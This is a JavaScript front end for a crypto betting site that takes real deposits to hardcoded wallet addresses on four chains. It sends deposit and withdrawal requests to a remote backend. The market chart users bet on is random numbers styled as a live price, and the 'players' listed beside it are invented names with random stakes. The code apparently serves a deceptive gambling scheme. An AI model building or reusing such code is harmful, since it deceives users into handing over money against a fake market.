const BACKEND = 'https://betwin-winn.onrender.com'; // Backend URL

/* ---------------- Multiple Wallets ---------------- */
const DEPOSIT_WALLETS = [
  { chain:'TRC20', addr:'TWZHqkbbYTnehQ2TxnH4NgNt4crGLNy8Ns' },
  { chain:'Polygon', addr:'0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B44' },
  { chain:'BEP20', addr:'0xE1D4b2BEC237AEDDB47da56b82b2f15812e45B44' },
  { chain:'TON', addr:'EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF' }
];

function initDepositWallets(){
  const depositWalletEl = document.getElementById('depositWalletSelect');
  DEPOSIT_WALLETS.forEach(w => {
    const opt = document.createElement('option');
    opt.value = w.addr;
    opt.textContent = `${w.chain}: ${w.addr}`;
    depositWalletEl.appendChild(opt);
  });

  document.getElementById('copyDepositWallet').addEventListener('click', async () => {
    try{
      await navigator.clipboard.writeText(depositWalletEl.value);
      log('Deposit wallet copied');
    } catch { log('Copy failed'); }
  });
}

initDepositWallets();

/* ---------------- User Balance ---------------- */
let balance = 0;
const balEl = document.getElementById('balance');
function setBalance(v){ balance=v; balEl.textContent=v.toFixed(2); }
setBalance(1.0); // Initial bonus

/* ---------------- Chart ---------------- */
const ctx = document.getElementById('priceChart').getContext('2d');
let series=[1.0];
let target=series[series.length-1];
let start=target;
function gradient(up=true){
  const g = ctx.createLinearGradient(0,0,0,360);
  g.addColorStop(0, up?'rgba(0,210,122,.18)':'rgba(255,77,79,.16)');
  g.addColorStop(1, up?'rgba(0,210,122,.04)':'rgba(255,77,79,.04)');
  return g;
}
const chart = new Chart(ctx,{
  type:'line',
  data:{ labels:[0], datasets:[{data:series,borderColor:'#0d0',backgroundColor:gradient(true),borderWidth:2.4,pointRadius:0,tension:0.35,fill:true}]},
  options:{ animation:false, plugins:{legend:{display:false},tooltip:{enabled:false}}, scales:{x:{display:false},y:{display:false}},responsive:true,maintainAspectRatio:false }
});

function pickTarget(){
  const drift=(Math.random()-0.5)*1.6;
  start=target; target=Math.max(0.1, +(target+drift).toFixed(3)); segStart=performance.now();
}
let segStart=performance.now();
setInterval(pickTarget,900);

function frame(ts){
  const p=Math.min(1,(ts-segStart)/900);
  const current=start+(target-start)*p;
  series.push(+current.toFixed(3));
  if(series.length>240) series.shift();
  chart.data.datasets[0].data=series;
  const up=current>=series[series.length-2];
  chart.data.datasets[0].borderColor=up?'#00d27a':'#ff4d4f';
  chart.data.datasets[0].backgroundColor=gradient(up);
  chart.update('none');

  document.getElementById('priceVal').textContent='$'+current.toFixed(3);
  document.getElementById('priceArrow').textContent=up?'▲':'▼';
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);

/* ---------------- Bots ---------------- */
const BOT_NAMES=['Alpha','Beta','CryptoKing','NehaX','Rahul23','Satoshi','Luna','Mira','Vikram','Zara'];
function randName(){ return BOT_NAMES[Math.floor(Math.random()*BOT_NAMES.length)]+Math.floor(Math.random()*90+10);}
function randAmt(){ return +(Math.random()*25+0.5).toFixed(2);}
function makeAvatarInitials(name){ return name.split(/[^A-Za-z0-9]/).map(s=>s[0]).slice(0,2).join('').toUpperCase();}
function genBots(count,side){ const arr=[]; for(let i=0;i<count;i++){ const n=randName(); arr.push({id:n+'_'+Math.floor(Math.random()*999),name:n,avatar:makeAvatarInitials(n),amount:randAmt(),side});} return arr;}
function renderBots(upBots,downBots){
  document.getElementById('upBotsList').innerHTML=upBots.map(b=>`<div class="bot"><div class="avatar" style="background:#0b2">${b.avatar}</div><div class="meta"><div class="name">${b.name}</div><div class="meta-sub">${b.side.toUpperCase()}</div></div><div class="amt">$${b.amount}</div></div>`).join('');
  document.getElementById('downBotsList').innerHTML=downBots.map(b=>`<div class="bot"><div class="avatar" style="background:#f66">${b.avatar}</div><div class="meta"><div class="name">${b.name}</div><div class="meta-sub">${b.side.toUpperCase()}</div></div><div class="amt">$${b.amount}</div></div>`).join('');
}
renderBots([],[]);

/* ---------------- Activity ---------------- */
const activity=document.getElementById('activity');
function log(text){
  const row=document.createElement('div');
  row.className='row';
  const t=new Date().toLocaleTimeString();
  row.innerHTML=`<span>${t}</span><span>${text}</span>`;
  activity.querySelector('.hint')?.remove();
  activity.prepend(row);
  while(activity.children.length>40) activity.lastChild.remove();
}

/* ---------------- Deposit/Withdraw ---------------- */
document.getElementById('openDeposit').addEventListener('click',()=>openModal('depositModal'));
document.getElementById('openWithdraw').addEventListener('click',()=>openModal('withdrawModal'));
document.querySelectorAll('[data-close]').forEach(btn=>btn.addEventListener('click',e=>closeModal(e.currentTarget.getAttribute('data-close'))));
function openModal(id){ document.getElementById(id).classList.remove('hidden'); }
function closeModal(id){ document.getElementById(id).classList.add('hidden'); }

document.getElementById('submitDeposit').addEventListener('click',async()=>{
  const wallet=document.getElementById('depositWalletSelect').value;
  const txn=document.getElementById('depositTxn').value.trim();
  if(!txn){ log('Enter transaction ID'); return; }
  const res=await fetch(`${BACKEND}/deposit`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({wallet,txn})
  });
  const data=await res.json();
  log(data.msg||'Deposit submitted');
  closeModal('depositModal');
});

document.getElementById('submitWithdraw').addEventListener('click',async()=>{
  const amt=parseFloat(document.getElementById('wdAmount').value||0);
  const wal=document.getElementById('wdWallet').value.trim();
  if(!(amt>=5)){ document.getElementById('withdrawMsg').textContent='Minimum $5 required'; return;}
  if(!wal){ document.getElementById('withdrawMsg').textContent='Enter wallet address'; return;}
  const res=await fetch(`${BACKEND}/withdraw`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({amt,wallet:wal})
  });
  const data=await res.json();
  log(data.msg||'Withdraw request submitted');
  setBalance(balance-amt);
  closeModal('withdrawModal');
});
